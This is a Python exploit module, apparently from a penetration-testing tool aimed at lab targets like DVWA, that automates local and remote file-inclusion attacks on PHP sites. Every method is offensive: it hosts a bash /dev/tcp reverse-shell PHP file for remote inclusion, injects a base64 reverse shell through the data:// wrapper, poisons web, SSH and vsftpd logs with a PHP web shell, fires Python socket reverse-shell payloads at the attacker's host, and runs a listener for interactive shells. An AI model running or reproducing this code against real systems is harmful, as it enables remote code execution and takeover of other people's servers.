import os
import subprocess
import requests
import time
import socket
import sys
import base64
import re
from threading import Thread
import http.server
import socketserver
from dynamicAnalysis import phpInfoLFI

class ExploitClass:
    def __init__(self, cookie, host_ip, base_url, target_url):
        self.cookie = cookie
        self.host_ip = host_ip
        self.base_url = base_url
        self.target_url = target_url

    def exploitPHPInfo(self):
        # Start netcat listener
        t = Thread(target=self.listener, args=(4444,))
        t.start()

        # Extract the base url
        baseUrl = self.base_url.replace("http://", '')
        baseUrl = re.sub('\/.*', '', baseUrl)

        # Extract vuln path without baseurl e.g /dvwa/phpinfo.php
        phpInfoURL = self.target_url.replace(baseUrl, '').replace('http://', '')

        # Extract vulnURL /dvwa/vulnerabilities/fi/?page=
        vulnURL = self.base_url.replace(baseUrl, '').replace('http://', '')

        # Run phpinfoexploit
        phpinfoExploit = phpInfoLFI.ExploitPHPInfo()
        phpinfoExploit.exploit(baseUrl, self.cookie, self.host_ip, phpInfoURL, vulnURL)

        t.join()

    # Exploit via RFI
    def exploitRFI(self):
        print('[Exploiting via RFI]')

        # Write to temp php file
        web_dir = os.path.join(os.path.dirname(__file__))
        os.chdir(web_dir)
        file = open('tmp_rev.php', 'w')
        payload = '''<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/''' + self.host_ip + '''/4444 0>&1'");'''
        file.write(payload)

        # Start netcat listener
        t = Thread(target=self.listener, args=(4444,))
        t.start()

        # Start tmp python listener on port 9123 to host the file
        Thread(target=self.startSimpleHTTPServer).start()

        # Send request to trigger tmp_rev.php
        Thread(target=self.triggerRevPhp).start()

        t.join()

    # Exploit via data wrapper
    def exploitDataWrapper(self):
        print('[Exploiting via data wrapper]')
        # Start netcat listener
        t = Thread(target=self.listener, args=(4444,))
        t.start()

        # Send rev shell from target
        time.sleep(3)
        Thread(target=self.dataWrapperSendReverseShell).start()

        t.join()
    # Exploit via access logs
    def exploitAccessLog(self):
        print('[Exploiting via access logs]')

        # change user agent to rev shell cmd, add the "$GET_cmd" parameter into access.log
        headers = {
            'User-Agent': "<?PHP echo exec($_GET['cmd'])?>"
        }
        requests.get(self.target_url, cookies=self.cookie)

        # start listener
        t = Thread(target=self.listener, args=(4444,))
        t.start()

        # Send the rev payload to launch shell
        revShellPayload = """&cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ipAddr}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""".format(
            ipAddr=self.host_ip, port=4444)
        requests.get(self.target_url + revShellPayload, cookies=self.cookie, headers=headers)

        t.join()

    # Exploit via access logs
    def exploitSSHAuthLog(self, host, port):
        print('[Exploiting via SSH auth logs]')
        # start listener
        Thread(target=self.listener, args=(4444,)).start()

        # send (poison auth log) with web shell payload through netcat via SSH
        t = Thread(target=self.poisonAuthLog, args=(host, port))
        t.start()

        time.sleep(3)
        # Send the rev payload to launch shell
        revShellPayload = """&cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ipAddr}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""".format(
            ipAddr=self.host_ip, port=4444)
        requests.get(self.target_url + revShellPayload, cookies=self.cookie)

        t.join()

    # Exploit via vsftpd logs
    def exploitVsftpdLog(self, host):
        print('[Exploiting via vsftpd logs]')
        # start listener
        Thread(target=self.listener, args=(4444,)).start()

        # send (poison vsftpd log) with web shell payload through ftp cmd
        t = Thread(target=self.poisonVsftpLog, args=(host,))
        t.start()

        time.sleep(3)
        # Send the rev payload to launch shell
        revShellPayload = """&cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ipAddr}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""".format(
            ipAddr=self.host_ip, port=4444)
        requests.get(self.target_url + revShellPayload, cookies=self.cookie)

        t.join()

    # Set up listener to receive rev shells
    def listener(self, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host_ip, port))
        s.listen(1)
        print("Listening on port " + str(port))
        conn, addr = s.accept()
        print('Connection received from ', addr)
        while True:
            # Receive data from the target and get user input
            ans = conn.recv(1024).decode()
            sys.stdout.write(ans)
            command = input()

            # Send command
            command += "\n"
            conn.send(command.encode())
            time.sleep(0.1)

            # Remove the output of the "input()" function
            sys.stdout.write("\033[A" + ans.split("\n")[-1])

    # Exploit via data wrapper
    def dataWrapperSendReverseShell(self):
        print('Sending rev shell from target...')
        # Craft exploit string & base64 encode
        exploitString = base64.b64encode(
            bytes('''<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/''' + self.host_ip + '''/4444 0>&1'");''', 'utf-8'))
        # Send exploit to target
        requests.get(self.base_url + "data://text/plain;base64," + exploitString.decode("utf-8"),
                     cookies=self.cookie)

    # Poison auth log
    def poisonVsftpLog(self, host):
        print('Poisoning vsftpd log...')

        # create tmp file to store username(payload)
        payload = "\"<?php system($_GET[\"cmd\"]); ?>\"\npassword\nbye"
        file_cwd = os.path.dirname(os.path.realpath(__file__))
        f = open('tmp_ftp.txt', 'w')
        f.write(payload)
        f.close()
        time.sleep(3)

        print(f"ftp -s:{file_cwd}/tmp_ftp.txt {host}")
        subprocess.Popen(f"ftp -s:{file_cwd}/tmp_ftp.txt {host}", shell=True, stdout=subprocess.DEVNULL).communicate()

    # Poison vsftpd log
    def poisonAuthLog(self, host, port):
        print('Poisoning ssh auth log...')
        payload = "\"<?php system($_GET[\"cmd\"]); ?>\""
        subprocess.Popen(f"ssh -tt -o StrictHostKeyChecking=no {payload}@{host} {port}", shell=True, stdout=subprocess.DEVNULL).communicate()

    # [Helper function] Trigger rev php file
    def triggerRevPhp(self):
        trigger_url = self.base_url + 'http://' + self.host_ip + ':9123/tmp_rev.php'
        requests.get(trigger_url, cookies=self.cookie)

    # [Helper function] Starts tmp SimpleHTTPServer to host the rev php file
    def startSimpleHTTPServer(self):
        PORT = 9123

        web_dir = os.path.join(os.path.dirname(__file__))
        os.chdir(web_dir)

        Handler = http.server.SimpleHTTPRequestHandler
        httpd = socketserver.TCPServer(("", PORT), Handler)
        print("SimpleHTTPServer serving at port", PORT)
        httpd.serve_forever()
